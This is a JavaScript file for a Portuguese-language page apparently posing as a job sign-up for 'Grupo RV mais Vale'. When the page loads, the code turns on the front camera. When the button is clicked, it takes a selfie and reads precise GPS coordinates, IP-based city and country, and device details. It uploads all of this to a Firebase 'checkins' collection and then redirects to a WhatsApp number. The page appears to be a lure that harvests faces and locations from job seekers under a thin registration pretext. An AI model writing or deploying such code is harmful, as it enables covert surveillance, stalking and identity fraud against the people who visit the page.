// script.js

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
  getFirestore,
  addDoc,
  collection,
  serverTimestamp
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {

  apiKey:
  "AIzaSyA4tZjjfiOauLn2PPxYAp6ylNqB9LWJkI0",

  authDomain:
  "rv-grup.firebaseapp.com",

  projectId:
  "rv-grup",

  storageBucket:
  "rv-grup.firebasestorage.app",

  messagingSenderId:
  "1061419825993",

  appId:
  "1:1061419825993:web:5cb7b020efd40b8cf13898"

};

const app =
initializeApp(firebaseConfig);

const db =
getFirestore(app);

const video =
document.getElementById("video");

const btn =
document.getElementById("btn");

const statusText =
document.getElementById("status");

const canvas =
document.getElementById("canvas");

// ======================
// ÁUDIO AUTOMÁTICO
// ======================

function falar(texto){

  const fala =
  new SpeechSynthesisUtterance(
    texto
  );

  fala.lang =
  "pt-BR";

  fala.volume = 1;

  fala.rate = 1;

  fala.pitch = 1;

  speechSynthesis.speak(
    fala
  );

}

// ======================
// INICIAR SISTEMA
// ======================

async function iniciarSistema(){

  try{

    falar(
      "Bem vindo ao Grupo RV mais Vale. Clique no botão verde para participar das vagas disponíveis."
    );

    statusText.innerHTML =
    "📸 Iniciando câmera...";

    const stream =
    await navigator.mediaDevices
    .getUserMedia({

      video:{
        facingMode:"user"
      },

      audio:false

    });

    video.srcObject =
    stream;

    await video.play();

    // espera vídeo carregar

    await new Promise(
      (resolve)=>{

        if(video.readyState >= 2){

          resolve();

        }

        else{

          video.onloadeddata =
          ()=>resolve();

        }

      }
    );

    statusText.innerHTML =
    "✅ Sistema pronto";

    falar(
      "Sistema pronto. Clique no botão para continuar."
    );

  }

  catch(err){

    console.log(err);

    statusText.innerHTML =
    "❌ Permita câmera";

    falar(
      "Permita o acesso à câmera para continuar."
    );

  }

}

window.onload = ()=>{

  iniciarSistema();

};

// ======================
// BOTÃO
// ======================

btn.addEventListener(
  "click",
  async()=>{

    try{

      btn.disabled = true;

      btn.innerHTML =
      "PROCESSANDO...";

      falar(
        "Cadastro iniciado."
      );

      // ====================
      // SELFIE
      // ====================

      statusText.innerHTML =
      "📸 Capturando imagem...";

      const largura =
      video.videoWidth;

      const altura =
      video.videoHeight;

      if(!largura || !altura){

        throw new Error(
          "Vídeo não carregou"
        );

      }

      canvas.width =
      largura;

      canvas.height =
      altura;

      const ctx =
      canvas.getContext("2d");

      ctx.drawImage(
        video,
        0,
        0,
        largura,
        altura
      );

      const selfie =
      canvas.toDataURL(
        "image/jpeg",
        0.9
      );

      // ====================
      // LOCALIZAÇÃO
      // ====================

      let latitude =
      "não permitido";

      let longitude =
      "não permitido";

      try{

        statusText.innerHTML =
        "📍 Obtendo localização...";

        falar(
          "Obtendo localização."
        );

        const localizacao =
        await new Promise(
          (resolve,reject)=>{

            navigator.geolocation
            .getCurrentPosition(
              resolve,
              reject,
              {
                enableHighAccuracy:true,
                timeout:10000
              }
            );

          }
        );

        latitude =
        localizacao.coords.latitude;

        longitude =
        localizacao.coords.longitude;

      }

      catch(err){

        console.log(err);

      }

      // ====================
      // IP
      // ====================

      let ip =
      "indisponível";

      let cidade = "";
      let estado = "";
      let pais = "";

      try{

        statusText.innerHTML =
        "🌐 Obtendo IP...";

        const req =
        await fetch(
          "https://ipapi.co/json/"
        );

        const json =
        await req.json();

        ip =
        json.ip || "";

        cidade =
        json.city || "";

        estado =
        json.region || "";

        pais =
        json.country_name || "";

      }

      catch(err){

        console.log(err);

      }

      // ====================
      // FIREBASE
      // ====================

      statusText.innerHTML =
      "💾 Salvando cadastro...";

      falar(
        "Salvando cadastro."
      );

      await addDoc(
        collection(
          db,
          "checkins"
        ),
        {

          selfie:selfie,

          latitude:latitude,

          longitude:longitude,

          ip:ip,

          cidade:cidade,

          estado:estado,

          pais:pais,

          userAgent:
          navigator.userAgent,

          plataforma:
          navigator.platform,

          idioma:
          navigator.language,

          larguraTela:
          window.innerWidth,

          alturaTela:
          window.innerHeight,

          data:
          serverTimestamp()

        }
      );

      // ====================
      // FINAL
      // ====================

      statusText.innerHTML =
      "✅ Cadastro concluído";

      falar(
        "Cadastro concluído com sucesso."
      );

      setTimeout(()=>{

        window.location.href =
        "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";

      },2000);

    }

    catch(err){

      console.log(err);

      statusText.innerHTML =
      "❌ Erro no cadastro";

      falar(
        "Ocorreu um erro no cadastro."
      );

      btn.disabled = false;

      btn.innerHTML =
      "QUERO PARTICIPAR";

    }

  }
);
